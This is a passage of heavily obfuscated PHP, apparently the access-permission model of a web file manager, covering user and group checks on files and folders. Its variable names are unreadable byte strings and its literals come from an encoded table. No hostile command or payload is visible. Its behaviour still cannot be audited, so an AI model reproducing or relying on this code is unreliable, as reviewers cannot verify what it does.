$_SERVER[™»È’øè]; $ó¢Ç›”À = Model($õÅï‚„Ì[566])->getInfo($Ù€´…ÛÓ); if (!$Ù€´…ÛÓ || !$ò¶–±¸Î || !$ó¢Ç›”À) { return array(); } $·ÏÎ…ç« = Model($õÅï‚„Ì[1362])->sourceInfo($ò¶–±¸Î); $ÓÌ©«Ç¦ = array(); $‘µ“™ = 1; if ($·ÏÎ…ç«[$õÅï‚„Ì[179]] == $õÅï‚„Ì[211] && $·ÏÎ…ç«[$õÅï‚„Ì[537]] != $‘µ“™ && $this->groupContainUser($·ÏÎ…ç«[$õÅï‚„Ì[537]], $Ù€´…ÛÓ)) { foreach ($ó¢Ç›”À[$õÅï‚„Ì[2057]] as $ã‚“ÍÔ¶) { $óèÇä¨¿ = Model($õÅï‚„Ì[553])->getInfo($ã‚“ÍÔ¶[$õÅï‚„Ì[1870]]); $ËåÆ–úâ = Model($õÅï‚„Ì[566])->getInfoSimpleOuter($Ù€´…ÛÓ); $ËåÆ–úâ[$õÅï‚„Ì[507]] = $ã‚“ÍÔ¶[$õÅï‚„Ì[454]]; if (Model($õÅï‚„Ì[539])->authCheckAction($ã‚“ÍÔ¶[$õÅï‚„Ì[454]][$õÅï‚„Ì[454]], $õÅï‚„Ì[1891])) { continue; } $ÏÎªÜØÅ = array($õÅï‚„Ì[32] => $õÅï‚„Ì[1238] . $óèÇä¨¿[$õÅï‚„Ì[32]], $õÅï‚„Ì[180] => $óèÇä¨¿[$õÅï‚„Ì[87]][$õÅï‚„Ì[180]], $õÅï‚„Ì[84] => KodIO::make($óèÇä¨¿[$õÅï‚„Ì[87]][$õÅï‚„Ì[180]]), $õÅï‚„Ì[179] => $õÅï‚„Ì[211], $õÅï‚„Ì[177] => $õÅï‚„Ì[546], $õÅï‚„Ì[33] => $õÅï‚„Ì[583], $õÅï‚„Ì[550] => $óèÇä¨¿[$õÅï‚„Ì[557]], $õÅï‚„Ì[1870] => $óèÇä¨¿[$õÅï‚„Ì[1870]], $õÅï‚„Ì[554] => $óèÇä¨¿[$õÅï‚„Ì[179]], $õÅï‚„Ì[2054] => array($ËåÆ–úâ)); $ÓÌ©«Ç¦[$ÏÎªÜØÅ[$õÅï‚„Ì[180]]] = $ÏÎªÜØÅ; } } $™Èâì¢· = array(); $±Á­ÆÙğ = $this->getAllChildren($ò¶–±¸Î); foreach ($±Á­ÆÙğ as $ÆÖÊàËï) { $»ìŒ¬İñ = !1; foreach ($ÆÖÊàËï[$õÅï‚„Ì[2054]] as $ß§àœğè) { if ($ß§àœğè[$õÅï‚„Ì[1678]]) { if ($ß§àœğè[$õÅï‚„Ì[1678]] == $Ù€´…ÛÓ) { $»ìŒ¬İñ = !0; break; } } if ($ß§àœğè[$õÅï‚„Ì[1870]]) { if ($this->groupContainUser($ß§àœğè[$õÅï‚„Ì[1870]], $Ù€´…ÛÓ)) { $»ìŒ¬İñ = !0; break; } } } if ($»ìŒ¬İñ) { $™Èâì¢·[] = $ÆÖÊàËï; } $«¨¬ç‡´ = $ÆÖÊàËï[$õÅï‚„Ì[180]]; if (isset($ÓÌ©«Ç¦[$«¨¬ç‡´])) { $ÆÖÊàËï[$õÅï‚„Ì[2054]][] = $ÓÌ©«Ç¦[$«¨¬ç‡´][0]; $ÓÌ©«Ç¦[$«¨¬ç‡´] = !1; } } $ÓÌ©«Ç¦ = array_filter(array_values($ÓÌ©«Ç¦)); $™Èâì¢· = array_merge($ÓÌ©«Ç¦, $™Èâì¢·); return $™Èâì¢·; } public function setAllChildrenByUser($§£ÔËÖÒ, $ÓŠä±±, $ó¸ˆ—÷) { $ µšî¦ =& $_SERVER[™»È’øè]; $«Ã†ØÖ± = $this->getAllChildrenByUser($§£ÔËÖÒ, $ÓŠä±±); if (!$ó¸ˆ—÷ || !$«Ã†ØÖ±) { return !1; } foreach ($«Ã†ØÖ± as $ƒ›¯çŒñ) { $¹ÖìŠêÈ = array(); foreach ($ƒ›¯çŒñ[$ µšî¦[2054]] as $©ÜÑ›Ö) { $Õ­ƒÆ¼İ = $©ÜÑ›Ö[$ µšî¦[507]]; $ÈÄ‘ó¬« = $©ÜÑ›Ö[$ µšî¦[1678]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Ì®¯óÉ = $©ÜÑ›Ö[$ µšî¦[1678]] ? $©ÜÑ›Ö[$ µšî¦[1678]] : $©ÜÑ›Ö[$ µšî¦[1870]]; if ($©ÜÑ›Ö[$ µšî¦[1678]] && $©ÜÑ›Ö[$ µšî¦[1678]] == $ÓŠä±±) { continue; } $¹ÖìŠêÈ[] = array($ µšî¦[180] => $ƒ›¯çŒñ[$ µšî¦[180]], $ µšî¦[177] => $ÈÄ‘ó¬«, $ µšî¦[537] => intval($Ì®¯óÉ), $ µšî¦[1974] => isset($Õ­ƒÆ¼İ[$ µšî¦[442]]) ? intval($Õ­ƒÆ¼İ[$ µšî¦[442]]) : 0, $ µšî¦[2034] => isset($Õ­ƒÆ¼İ[$ µšî¦[2034]]) ? intval($Õ­ƒÆ¼İ[$ µšî¦[2034]]) : -1); } $¹ÖìŠêÈ[] = array($ µšî¦[180] => $ƒ›¯çŒñ[$ µšî¦[180]], $ µšî¦[177] => SourceModel::TYPE_USER, $ µšî¦[537] => intval($ÓŠä±±), $ µšî¦[1974] => intval($ó¸ˆ—÷), $ µšî¦[2034] => -1); $this->where(array($ µšî¦[458] => $ƒ›¯çŒñ[$ µšî¦[180]]))->delete(); $this->addAll($¹ÖìŠêÈ); } return !0; } public function get($ÇêÏîòÉ) { $×ªÖò‰¹ = $this->getSourceList(array($ÇêÏîòÉ), !0); return $×ªÖò‰¹[0]; } public function getSourceList($«ÂôÀ², $æêéø½ = false, $ƒƒîÁ¹‰ = false) { $°“¹ı²á =& $_SERVER[™»È’øè]; if (!$«ÂôÀ²) { return array(); } $ÜâÆó“ô = Model($°“¹ı²á[1362]); if (!$æêéø½ && count($«ÂôÀ²) == 1) { $æêéø½ = array(); $æêéø½[$«ÂôÀ²[0]] = $ÜâÆó“ô->sourceInfo($«ÂôÀ²[0]); } if (!$æêéø½) { $¼ŸÈÂæú = array($°“¹ı²á[458] => array($°“¹ı²á[459], $«ÂôÀ²)); $æêéø½ = $ÜâÆó“ô->field($°“¹ı²á[2058])->where($¼ŸÈÂæú)->select(); $æêéø½ = array_to_keyvalue($æêéø½, $°“¹ı²á[180]); } $ç¸Ø“ = $«ÂôÀ²; foreach ($æêéø½ as $ì·Æ±£“ => $ŞÖ»ÍË¯) { $îÄ›Ø“ = $ÜâÆó“ô->parentLevelArray($ŞÖ»ÍË¯[$°“¹ı²á[552]]); $ç¸Ø“ = array_merge($ç¸Ø“, array($ì·Æ±£“), array_reverse($îÄ›Ø“)); } $ç¸Ø“ = array_values(array_unique($ç¸Ø“)); if (!$ç¸Ø“) { return array(); } $ñÓ°Å¹Ú = $this->sourceAuthSelect($ç¸Ø“); $€ÓÖ¨Ë = array(); foreach ($ç¸Ø“ as $ìş–°Õê) { if (isset($ñÓ°Å¹Ú[$ìş–°Õê])) { $€ÓÖ¨Ë[$ìş–°Õê] = $ñÓ°Å¹Ú[$ìş–°Õê]; } } $à™ªëš  = $this->userIsRoot($ƒƒîÁ¹‰); $¥«ë¢ç÷ = AuthModel::authAll(); $¸‡¬Ú = array($°“¹ı²á[455] => $¥«ë¢ç÷, $°“¹ı²á[2059] => array($°“¹ı²á[460] => 0, $°“¹ı²á[1876] => $¥«ë¢ç÷, $°“¹ı²á[461] => LNG($°“¹ı²á[2060]), $°“¹ı²á[1893] => $°“¹ı²á[2061])); $ìè”ê´ö = array(); foreach ($æêéø½ as $ìş–°Õê => $¯×¢‘™—) { if ($à™ªëš  && $GLOBALS[$°“¹ı²á[6]][$°“¹ı²á[1889]]) { $ìè”ê´ö[$ìş–°Õê] = $¸‡¬Ú; continue; } $ìè”ê´ö[$ìş–°Õê] = $this->makeSourceAuth($¯×¢‘™—, $€ÓÖ¨Ë, $ƒƒîÁ¹‰); } return $ìè”ê´ö; } public function authDeepCheck($ùü¾Ùå, $Ë©ªÈùö = false) { $µİá¥ ü =& $_SERVER[™»È’øè]; $Ë©ªÈùö = $Ë©ªÈùö ? $Ë©ªÈùö : USER_ID; $«Òñ•›š = $this->makeAuthDeep($Ë©ªÈùö); if (!in_array($ùü¾Ùå, $«Òñ•›š[$µİá¥ ü[2062]])) { return !1; } $ÎñŒ¶£ = array(); foreach ($«Òñ•›š[$µİá¥ ü[2063]] as $–ğŸ¹‚è => $ò¨ïäÑô) { if (!in_array($ùü¾Ùå, $ò¨ïäÑô)) { continue; } $ÎñŒ¶£[] = $–ğŸ¹‚è; } if (!$ÎñŒ¶£) { return !1; } $ŞÔŒòç‚ = $ÎñŒ¶£ ? $ÎñŒ¶£[0] : $ùü¾Ùå; return array($µİá¥ ü[455] => -1, $µİá¥ ü[507] => array($µİá¥ ü[460] => $µİá¥ ü[1218], $µİá¥ ü[1876] => $µİá¥ ü[211], $µİá¥ ü[461] => LNG($µİá¥ ü[2064]), $µİá¥ ü[1893] => $µİá¥ ü[2065]), $µİá¥ ü[2066] => LNG($µİá¥ ü[2067]), $µİá¥ ü[2068] => $this->sourceAuthInfo($ŞÔŒòç‚)); } protected function makeAuthDeep($á¿ÜµŒÜ = false) { $ñ¸¤¯ÀÇ =& $_SERVER[™»È’øè]; static $Ù¯ùõ†ë = array(); $á¿ÜµŒÜ = $á¿ÜµŒÜ ? $á¿ÜµŒÜ : USER_ID; if (isset($Ù¯ùõ†ë[$á¿ÜµŒÜ])) { return $Ù¯ùõ†ë[$á¿ÜµŒÜ]; } $·§æşø¤ = Model($ñ¸¤¯ÀÇ[2069])->listData(); $•İı‘°¨ = array(); foreach ($·§æşø¤ as $Ô–¼²›) { if ($Ô–¼²›[$ñ¸¤¯ÀÇ[454]] == 0 && $Ô–¼²›[$ñ¸¤¯ÀÇ[1892]] == $ñ¸¤¯ÀÇ[88]) { $•İı‘°¨[] = $Ô–¼²›[$ñ¸¤¯ÀÇ[442]]; } } $õãØÈı» = $this->userGroupParents($á¿ÜµŒÜ); $Ù‰Úé²¹ = array($ñ¸¤¯ÀÇ[177] => SourceModel::TYPE_USER, $ñ¸¤¯ÀÇ[537] => $á¿ÜµŒÜ); if ($õãØÈı») { $Ù‰Úé²¹ = array(array($ñ¸¤¯ÀÇ[177] => SourceModel::TYPE_USER, $ñ¸¤¯ÀÇ[537] => $á¿ÜµŒÜ), array($ñ¸¤¯ÀÇ[177] => SourceModel::TYPE_GROUP, $ñ¸¤¯ÀÇ[537] => array($ñ¸¤¯ÀÇ[459], $õãØÈı»)), $ñ¸¤¯ÀÇ[1030] => $ñ¸¤¯ÀÇ[1968]); } $¬Í±úøÖ = $this->field($ñ¸¤¯ÀÇ[2070])->where($Ù‰Úé²¹)->select(); $­§…”–ò = array(); $ãÅ£¦µú = array_to_keyvalue_group($¬Í±úøÖ, $ñ¸¤¯ÀÇ[180]); foreach ($ãÅ£¦µú as $©µ¦Â¯´ => $æİÙ÷®‘) { $Á•ÕğÙş = $this->authArrayCheck($æİÙ÷®‘, $á¿ÜµŒÜ); if ($Á•ÕğÙş[$ñ¸¤¯ÀÇ[455]] > 0) { $­§…”–ò[] = $©µ¦Â¯´ . $ñ¸¤¯ÀÇ[12]; } } if ($õãØÈı») { $µİ°ñŒ = Model($ñ¸¤¯ÀÇ[553]); foreach ($õãØÈı» as $•§„ëÜ•) { $¿ƒÚ¥µĞ = $µİ°ñŒ->getInfo($•§„ëÜ•); if (!$¿ƒÚ¥µĞ || !is_array($¿ƒÚ¥µĞ[$ñ¸¤¯ÀÇ[87]])) { continue; } $­§…”–ò[] = $¿ƒÚ¥µĞ[$ñ¸¤¯ÀÇ[87]][$ñ¸¤¯ÀÇ[180]]; } } $ ğ”îÊ­ = array(); $ƒµ = $õãØÈı»; $­™øùşœ = Model($ñ¸¤¯ÀÇ[1362]); $µİ°ñŒ = Model($ñ¸¤¯ÀÇ[553]); $®©Å‡Ò× = array(); $‹Ü”¢Õû = array(); $Á©Í¸† = array(); $€ÚÓÏ×ü = array(); if ($­§…”–ò) { $áç–ß÷ó = $­™øùşœ->where(array($ñ¸¤¯ÀÇ[180] => array($ñ¸¤¯ÀÇ[459], $­§…”–ò)))->select(); foreach ($áç–ß÷ó as $ š÷—û) { $ºƒ¾¼•Ñ = $­™øùşœ->parentLevelArray($ š÷—û[$ñ¸¤¯ÀÇ[552]]); $ ğ”îÊ­ = array_merge($ ğ”îÊ­, $ºƒ¾¼•Ñ); $ƒµ[] = $ š÷—û[$ñ¸¤¯ÀÇ[537]]; $®©Å‡Ò×[$ š÷—û[$ñ¸¤¯ÀÇ[180]]] = $ºƒ¾¼•Ñ; $‹Ü”¢Õû[$ š÷—û[$ñ¸¤¯ÀÇ[180]]] = $ š÷—û[$ñ¸¤¯ÀÇ[537]]; } } $ƒµ = array_values(array_unique($ƒµ)); $ÓÌß¹ì = $ƒµ; foreach ($ÓÌß¹ì as $•§„ëÜ•) { $¿ƒÚ¥µĞ = $µİ°ñŒ->getInfo($•§„ëÜ•); $ºƒ¾¼•Ñ = $­™øùşœ->parentLevelArray($¿ƒÚ¥µĞ[$ñ¸¤¯ÀÇ[552]]); $ƒµ = array_merge($ƒµ, $ºƒ¾¼•Ñ); } $ƒµ = array_values(array_unique($ƒµ)); foreach ($ƒµ as $•§„ëÜ•) { $¿ƒÚ¥µĞ = $µİ°ñŒ->getInfo($•§„ëÜ•); $ ğ”îÊ­[] = $¿ƒÚ¥µĞ[$ñ¸¤¯ÀÇ[87]][$ñ¸¤¯ÀÇ[180]]; $Á©Í¸†[$•§„ëÜ•] = $¿ƒÚ¥µĞ[$ñ¸¤¯ÀÇ[87]][$ñ¸¤¯ÀÇ[180]]; $€ÚÓÏ×ü[$•§„ëÜ•] = $­™øùşœ->parentLevelArray($¿ƒÚ¥µĞ[$ñ¸¤¯ÀÇ[552]]); } foreach ($®©Å‡Ò× as $àÄ©ş¶ => $´¬ĞğÀŒ) { $¦ï°Ò—¿ = $‹Ü”¢Õû[$àÄ©ş¶]; if (!$¦ï°Ò—¿ || !$Á©Í¸†[$¦ï°Ò—¿]) { continue; } $ş‘òœÛ­ = array(); foreach ($€ÚÓÏ×ü[$¦ï°Ò—¿] as $•§„ëÜ•) { $ş‘òœÛ­[] = $Á©Í¸†[$•§„ëÜ•]; } $®©Å‡Ò×[$àÄ©ş¶] = array_merge($ş‘òœÛ­, $´¬ĞğÀŒ); } $ ğ”îÊ­ = array_values(array_unique($ ğ”îÊ­)); $×ë²Ôõ = array($ñ¸¤¯ÀÇ[2062] => $ ğ”îÊ­, $ñ¸¤¯ÀÇ[2063] => $®©Å‡Ò×); $Ù¯ùõ†ë[$á¿ÜµŒÜ] = $×ë²Ôõ; return $×ë²Ôõ; } private function makeSourceAuth($×óñ¥µä, $«†¢É÷, $±éıİ®î = false) { $ÌÄëÎí =& $_SERVER[™»È’øè]; $‘çÒ²ÂÁ = $ÌÄëÎí[88]; $«ôÕùË = $×óñ¥µä[$ÌÄëÎí[537]]; $ã¹…£¸Ç = $×óñ¥µä[$ÌÄëÎí[177]] == SourceModel::TYPE_GROUP; $İËêĞ®Ø = $ã¹…£¸Ç ? $this->groupRootAuth($«ôÕùË, $±éıİ®î) : !1; if ($İËêĞ®Ø && Model($ÌÄëÎí[539])->authCheckAction($İËêĞ®Ø[$ÌÄëÎí[454]], $ÌÄëÎí[1891])) { return $this->groupAuthInfo($İËêĞ®Ø, $«ôÕùË); } $ıÏ¾ÏŸÆ = Model($ÌÄëÎí[1362])->parentLevelArray($×óñ¥µä[$ÌÄëÎí[552]]); $ıÏ¾ÏŸÆ = array_merge(array($×óñ¥µä[$ÌÄëÎí[180]]), array_reverse($ıÏ¾ÏŸÆ)); $Çƒ»äğ = !1; foreach ($ıÏ¾ÏŸÆ as $á¤â´„£) { if (!isset($«†¢É÷[$á¤â´„£])) { continue; } $Ş“´“Äå = $this->authMake($«†¢É÷[$á¤â´„£], $±éıİ®î); if ($Ş“´“Äå[$ÌÄëÎí[507]]) { $Çƒ»äğ = $Ş“´“Äå; break; } } if (!$ã¹…£¸Ç) { return $Çƒ»äğ; } if (!$Çƒ»äğ && $İËêĞ®Ø) { $Çƒ»äğ = $this->groupAuthInfo($İËêĞ®Ø, $«ôÕùË); } if (!$Çƒ»äğ) { $çòş©´¯ = Model($ÌÄëÎí[553])->getInfo($«ôÕùË); $™™óÕş¡ = explode($ÌÄëÎí[50], trim($çòş©´¯[$ÌÄëÎí[552]], $ÌÄëÎí[50])); $™™óÕş¡ = array_reverse($™™óÕş¡); foreach ($™™óÕş¡ as $öè›ßŸ) { if ($öè›ßŸ == $ÌÄëÎí[211] || $öè›ßŸ == $‘çÒ²ÂÁ) { continue; } $ş‘Óğ¼ = $this->groupRootAuth($öè›ßŸ, $±éıİ®î); if (!$ş‘Óğ¼) { continue; } $Çƒ»äğ = $this->groupAuthInfo($ş‘Óğ¼, $öè›ßŸ); break; } } if (!$Çƒ»äğ || $Çƒ»äğ[$ÌÄëÎí[455]] <= 0) { $¸¦·¾œ = $this->authDeepCheck($×óñ¥µä[$ÌÄëÎí[180]], $±éıİ®î); if ($¸¦·¾œ) { $Çƒ»äğ = $¸¦·¾œ; } } return $Çƒ»äğ; } private function userIsRoot($¯ÂèíÍß = false) { $ç–‡Ôì¶ =& $_SERVER[™»È’øè]; if (!$¯ÂèíÍß && _get($GLOBALS, $ç–‡Ôì¶[535])) { return !0; } $àŠ¡Æˆ˜ = Model($ç–‡Ôì¶[566])->getInfo($¯ÂèíÍß); $ÎŒÍ”²ö = Model($ç–‡Ôì¶[2071])->listData($àŠ¡Æˆ˜[$ç–‡Ôì¶[1551]]); if ($ÎŒÍ”²ö && $ÎŒÍ”²ö[$ç–‡Ôì¶[543]][$ç–‡Ôì¶[2072]] == 1) { return !0; } return !1; } private function sourceAuthInfo($¨•°Î) { $Ùïœ­ñå =& $_SERVER[™»È’øè]; $Ó›Ñãôº = Model($Ùïœ­ñå[1362]); $¤üšÒÃ = $Ó›Ñãôº->sourceInfo($¨•°Î); if (!$¤üšÒÃ) { return !1; } $Ó›Ñãôº->groupPathDisplay($¤üšÒÃ); $ÄÍÛ‘Ô = array($¤üšÒÃ); $ÄÍÛ‘Ô = $Ó›Ñãôº->_listAppendPath($ÄÍÛ‘Ô); $¤üšÒÃ = $ÄÍÛ‘Ô[0]; $ĞéÇ£¸÷ = $¤üšÒÃ[$Ùïœ­ñå[550]]; if (isset($¤üšÒÃ[$Ùïœ­ñå[558]])) { $ŞÊ—²Ã¨ = explode($Ùïœ­ñå[8], trim($¤üšÒÃ[$Ùïœ­ñå[550]], $Ùïœ­ñå[8])); array_shift($ŞÊ—²Ã¨); $ĞéÇ£¸÷ = $¤üšÒÃ[$Ùïœ­ñå[556]] . $Ùïœ­ñå[2073] . implode($Ùïœ­ñå[8], $ŞÊ—²Ã¨); } return array($Ùïœ­ñå[461] => $¤üšÒÃ[$Ùïœ­ñå[32]], $Ùïœ­ñå[84] => KodIO::make($¤üšÒÃ[$Ùïœ­ñå[180]]), $Ùïœ­ñå[2074] => $ĞéÇ£¸÷); } private function groupAuthInfo($©Í†ü‘, $·¯½àş˜) { $âşÔœ²î =& $_SERVER[™»È’øè]; $Õ§ä˜ñ¨ = Model($âşÔœ²î[553])->getInfo($·¯½àş˜); return array($âşÔœ²î[2075] => intval($©Í†ü‘[$âşÔœ²î[454]]), $âşÔœ²î[2059] => $©Í†ü‘, $âşÔœ²î[2076] => LNG($âşÔœ²î[2077]), $âşÔœ²î[2068] => array($âşÔœ²î[461] => $Õ§ä˜ñ¨[$âşÔœ²î[32]], $âşÔœ²î[84] => KodIO::make($Õ§ä˜ñ¨[$âşÔœ²î[87]][$âşÔœ²î[180]]), $âşÔœ²î[2074] => $Õ§ä˜ñ¨[$âşÔœ²î[557]])); } protected function groupRootAuth($§ô¹¢‘‚, $›Ù· = false) { $‚…ÁÏß‘ =& $_SERVER[™»È’øè]; $›Ù· = $›Ù· ? $›Ù· : USER_ID; $ÀÆÌ¸ô  = $›Ù· . $‚…ÁÏß‘[2078] . $§ô¹¢‘‚; static $‡Ÿä¡Ñ° = array(); if (isset($‡Ÿä¡Ñ°[$ÀÆÌ¸ô ])) { return $‡Ÿä¡Ñ°[$ÀÆÌ¸ô ]; } $¨ë½Â¡™ = Model($‚…ÁÏß‘[553])->getInfo($§ô¹¢‘‚); $²åÔ¡»Ü = $this->userGroupList($›Ù·); $©æËğ½« = isset($²åÔ¡»Ü[$§ô¹¢‘‚]) ? $²åÔ¡»Ü[$§ô¹¢‘‚][$‚…ÁÏß‘[454]] : !1; if ($©æËğ½« && Model($‚…ÁÏß‘[539])->authCheckAction($©æËğ½«[$‚…ÁÏß‘[454]], $‚…ÁÏß‘[1891])) { $‡Ÿä¡Ñ°[$ÀÆÌ¸ô ] = $©æËğ½«; return $©æËğ½«; } $‚ÇÁ¥“ = $this->sourceAuthSelect($¨ë½Â¡™[$‚…ÁÏß‘[87]][$‚…ÁÏß‘[180]]); $¬ƒÊ—ï® = $‚ÇÁ¥“ ? $this->authMake($‚ÇÁ¥“, $›Ù·) : !1; $†çâºİ = $¬ƒÊ—ï® ? $¬ƒÊ—ï®[$‚…ÁÏß‘[507]] : !1; $‡Ÿä¡Ñ°[$ÀÆÌ¸ô ] = $†çâºİ ? $†çâºİ : $©æËğ½«; return $‡Ÿä¡Ñ°[$ÀÆÌ¸ô ]; } public function authOwnerApply($Ó•¿­î¾) { $“ÀşÍÈ¤ =& $_SERVER[™»È’øè]; if (empty($Ó•¿­î¾[$“ÀşÍÈ¤[454]]) || isset($Ó•¿­î¾[$“ÀşÍÈ¤[2079]]) && $Ó•¿­î¾[$“ÀşÍÈ¤[2079]]) { return $Ó•¿­î¾; } if (AuthModel::authCheckRoot($Ó•¿­î¾[$“ÀşÍÈ¤[454]][$“ÀşÍÈ¤[455]])) { return $Ó•¿­î¾; } $×ŠˆÃ¢Ó = Model($“ÀşÍÈ¤[1362])->parentLevelArray($Ó•¿­î¾[$“ÀşÍÈ¤[552]]); $×ŠˆÃ¢Ó = array_merge(array($Ó•¿­î¾[$“ÀşÍÈ¤[180]]), array_reverse($×ŠˆÃ¢Ó)); $‰¯ì ı” = $this->sourceAuthSelect($×ŠˆÃ¢Ó); $—À÷‰‡° = array(); $Ô­êÇŞñ = array(); foreach ($‰¯ì ı” as $ùË‡‹á€ => $‰¼¿åÔü) { $ùüÆ´ñÁ = $this->authFolderOwnerUser($‰¼¿åÔü); $—À÷‰‡°[$ùË‡‹á€] = $ùüÆ´ñÁ; $Ô­êÇŞñ = array_merge($Ô­êÇŞñ, $ùüÆ´ñÁ[$“ÀşÍÈ¤[629]]); if ($ùüÆ´ñÁ[$“ÀşÍÈ¤[2080]]) { break; } } if (count($Ô­êÇŞñ) == 0) { $Ô­êÇŞñ = $this->authFolderOwnerGroup($Ó•¿­î¾[$“ÀşÍÈ¤[537]]); } $Ô­êÇŞñ = array_unique($Ô­êÇŞñ); if (AuthModel::authCheckRoot($Ó•¿­î¾[$“ÀşÍÈ¤[454]][$“ÀşÍÈ¤[455]])) { $Ô­êÇŞñ[] = USER_ID; } $Ó•¿­î¾[$“ÀşÍÈ¤[454]][$“ÀşÍÈ¤[2081]] = Model($“ÀşÍÈ¤[545])->userListInfo($Ô­êÇŞñ); return $Ó•¿­î¾; } private function authFolderOwnerGroup($òø¤‘ö¬) { $Ö€¶µ¤” =& $_SERVER[™»È’øè]; $óÈ¿ÈŞ = Model($Ö€¶µ¤”[1960])->where(array($Ö€¶µ¤”[1870] => $òø¤‘ö¬))->select(); $•†ƒÊº = array(); if (!$óÈ¿ÈŞ) { return $•†ƒÊº; } foreach ($óÈ¿ÈŞ as $Š™‘Â™) { $Îï•Æëı = $this->authInfo($Š™‘Â™); if (AuthModel::authCheckRoot($Îï•Æëı[$Ö€¶µ¤”[454]])) { $•†ƒÊº[] = $Š™‘Â™[$Ö€¶µ¤”[1678]]; } } return $•†ƒÊº; } private function authFolderOwnerUser($Éà‹øú×) { $‰ ªò¾Á =& $_SERVER[™»È’øè]; $×Éš•¡ = array(); $º°¿¼İÆ = !1; foreach ($Éà‹øú× as $÷äè·«ã) { $­ĞÔÚşº = $this->authInfo($÷äè·«ã); if ($÷äè·«ã[$‰ ªò¾Á[537]] == $‰ ªò¾Á[211]) { $º°¿¼İÆ = !0; } if ($÷äè·«ã[$‰ ªò¾Á[177]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($­ĞÔÚşº[$‰ ªò¾Á[454]])) { $×Éš•¡[] = $÷äè·«ã[$‰ ªò¾Á[537]]; } } } return array($‰ ªò¾Á[629] => $×Éš•¡, $‰ ªò¾Á[2080] => $º°¿¼İÆ); } public function authMake($ª×¼öû, $»Ï–Ñ—Û = false) { $›Ğü½Ùì =& $_SERVER[™»È’øè]; $ ÕÉ¶á« = $this->authArrayCheck($ª×¼öû, $»Ï–Ñ—Û); if ($ ÕÉ¶á«[$›Ğü½Ùì[2082]]) { $ ÕÉ¶á«[$›Ğü½Ùì[2082]] = $this->sourceAuthInfo($ ÕÉ¶á«[$›Ğü½Ùì[2082]]); } return $ ÕÉ¶á«; } public function authArrayCheck($ÛšÒ­ˆÀ, $øŸŠãé¶ = false) { $ó†Á¤ÇÉ =& $_SERVER[™»È’øè]; if (!$ÛšÒ­ˆÀ) { return array($ó†Á¤ÇÉ[455] => 0, $ó†Á¤ÇÉ[507] => !1); } $øŸŠãé¶ = $øŸŠãé¶ ? $øŸŠãé¶ : USER_ID; $Éêƒ€¢ = 0; $ÏœŸÂòÅ = 0; $¥ÂõöÖ = 0; $•ç®¨†Ã = 0; $”ü†› = 0; $‘‰ ©Ñú = 0; $ø¼æşæ = 1000; $ËğüáØá = 0; $Ì®ç·¥Æ = 0; $Æ„–ˆüï = 0; $®üßÖ±î = 0; $ñ…À× = array($ó†Á¤ÇÉ[180] => 0); foreach ($ÛšÒ­ˆÀ as $ñ…À×) { $¹·‘Ò¤ = $this->authInfo($ñ…À×); if (!$¹·‘Ò¤) { continue; } $½ÒÓœ‚¸ = $ñ…À×[$ó†Á¤ÇÉ[537]]; $ãÏ°¯¦ = intval($¹·‘Ò¤[$ó†Á¤ÇÉ[454]]); if ($ñ…À×[$ó†Á¤ÇÉ[177]] == SourceModel::TYPE_USER && $½ÒÓœ‚¸ == $øŸŠãé¶) { $Éêƒ€¢ = !0; $¥ÂõöÖ = $¹·‘Ò¤; $ÏœŸÂòÅ = $ãÏ°¯¦; } else { if ($ñ…À×[$ó†Á¤ÇÉ[177]] == SourceModel::TYPE_GROUP && $this->groupContainUser($½ÒÓœ‚¸, $øŸŠãé¶)) { $•ç®¨†Ã = !0; $‰½ªËõó = $this->groupStepToUserGroup($½ÒÓœ‚¸, $øŸŠãé¶); if ($‰½ªËõó < $ø¼æşæ) { $ø¼æşæ = $‰½ªËõó; $”ü†› = $ãÏ°¯¦; $‘‰ ©Ñú = $¹·‘Ò¤; $ËğüáØá = $½ÒÓœ‚¸; } if ($‰½ªËõó == $ø¼æşæ && $ãÏ°¯¦ >= $”ü†›) { $”ü†› = $ãÏ°¯¦; $‘‰ ©Ñú = $¹·‘Ò¤; $ËğüáØá = $½ÒÓœ‚¸; } } else { if ($½ÒÓœ‚¸ == $ó†Á¤ÇÉ[211]) { $Ì®ç·¥Æ = !0; $®üßÖ±î = $¹·‘Ò¤; $Æ„–ˆüï = $ãÏ°¯¦; } } } } if ($Éêƒ€¢) { $İ‹äùÜ· = $ÏœŸÂòÅ; $¹·‘Ò¤ = $¥ÂõöÖ; $ğÚ©ò = LNG($ó†Á¤ÇÉ[2083]); } else { if ($•ç®¨†Ã) { $İ‹äùÜ· = $”ü†›; $¹·‘Ò¤ = $‘‰ ©Ñú; $××¨Îî„ = Model($ó†Á¤ÇÉ[553])->getInfo($ËğüáØá); $ğÚ©ò = $ó†Á¤ÇÉ[162] . $××¨Îî„[$ó†Á¤ÇÉ[557]] . $ó†Á¤ÇÉ[2084] . LNG($ó†Á¤ÇÉ[2085]); } else { if ($Ì®ç·¥Æ) { $İ‹äùÜ· = $Æ„–ˆüï; $¹·‘Ò¤ = $®üßÖ±î; $ğÚ©ò = LNG($ó†Á¤ÇÉ[2056]); } else { $İ‹äùÜ· = 0; $¹·‘Ò¤ = !1; $ğÚ©ò = $ó†Á¤ÇÉ[12]; } } } $ëÛ°ù¬ = array($ó†Á¤ÇÉ[2075] => intval($İ‹äùÜ·), $ó†Á¤ÇÉ[2059] => $¹·‘Ò¤, $ó†Á¤ÇÉ[2076] => $ğÚ©ò, $ó†Á¤ÇÉ[2068] => $ñ…À×[$ó†Á¤ÇÉ[180]]); return $ëÛ°ù¬; } private function groupContainUser($Ìç×–õ”, $ù×­Á = false) { return in_array($Ìç×–õ”, $this->userGroupParents($ù×­Á)); } private function groupStepToUserGroup($ïæõê×Ş, $Ä‚èŠ›Ù = false) { $œ—ªşÙø =& $_SERVER[™»È’øè]; $Úø÷Á¥ç = $this->userGroupList($Ä‚èŠ›Ù); $àä‡ÃÚš = 1000; $ºüµØ“  = $GLOBALS[$œ—ªşÙø[6]][$œ—ªşÙø[89]][$œ—ªşÙø[1973]] == 1; $ÜÅÖ·‰ñ = $ºüµØ“  ? 3 : 2; foreach ($Úø÷Á¥ç as $Ñ«•ë¡Ò) { if ($Ñ«•ë¡Ò[$œ—ªşÙø[1870]] == $ïæõê×Ş) { return 0; } $æ¡ßı ¬ = explode($œ—ªşÙø[50], trim($Ñ«•ë¡Ò[$œ—ªşÙø[552]], $œ—ªşÙø[50])); if ($æ¡ßı ¬[0] == $œ—ªşÙø[211] && count($æ¡ßı ¬) > $ÜÅÖ·‰ñ) { 